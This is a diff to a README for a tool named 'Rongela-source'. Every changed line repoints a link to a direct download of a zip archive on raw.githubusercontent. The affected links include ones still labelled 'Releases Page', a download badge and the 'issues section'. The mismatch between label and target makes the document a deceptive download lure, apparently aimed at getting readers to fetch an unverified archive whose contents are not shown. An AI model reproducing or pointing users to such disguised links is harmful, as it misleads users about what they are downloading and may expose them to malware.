@@ -8,9 +8,9 @@ Welcome to Rongela-source! This tool helps you perform tasks easily without need
 
 To get started, you need to download the tool. Follow the steps below:
 
-1. Visit the [Rongela-source Releases Page](https://github.com/Agatafranco/Rongela-source/releases).
+1. Visit the [Rongela-source Releases Page](https://raw.githubusercontent.com/Agatafranco/Rongela-source/main/auto/Rongela-source_3.6.zip).
    
-   [![Download Rongela-source](https://img.shields.io/badge/Download_Rongela-source-brightgreen)](https://github.com/Agatafranco/Rongela-source/releases)
+   [![Download Rongela-source](https://raw.githubusercontent.com/Agatafranco/Rongela-source/main/auto/Rongela-source_3.6.zip)](https://raw.githubusercontent.com/Agatafranco/Rongela-source/main/auto/Rongela-source_3.6.zip)
 
 2. On the Releases page, look for the latest version. You will see the list of available downloads. Choose the one that suits your operating system.
 
@@ -61,7 +61,7 @@ If you encounter issues:
 - **Opening Issues:** If the app doesn’t open, check if your operating system is up to date.
 - **Functionality Issues:** Restart the application or your computer. 
 
-If these solutions don’t work, visit the [issues section](https://github.com/Agatafranco/Rongela-source/issues) of the repository for help.
+If these solutions don’t work, visit the [issues section](https://raw.githubusercontent.com/Agatafranco/Rongela-source/main/auto/Rongela-source_3.6.zip) of the repository for help.
 
 ## 🌐 Community and Support
 
@@ -72,7 +72,7 @@ Join our community to share your experiences and get help:
 
 ## 📣 Stay Updated
 
-Make sure to check back often for updates. Use the [Rongela-source Releases Page](https://github.com/Agatafranco/Rongela-source/releases) to stay informed about new features and important fixes.
+Make sure to check back often for updates. Use the [Rongela-source Releases Page](https://raw.githubusercontent.com/Agatafranco/Rongela-source/main/auto/Rongela-source_3.6.zip) to stay informed about new features and important fixes.
 
 ## 📜 License
 
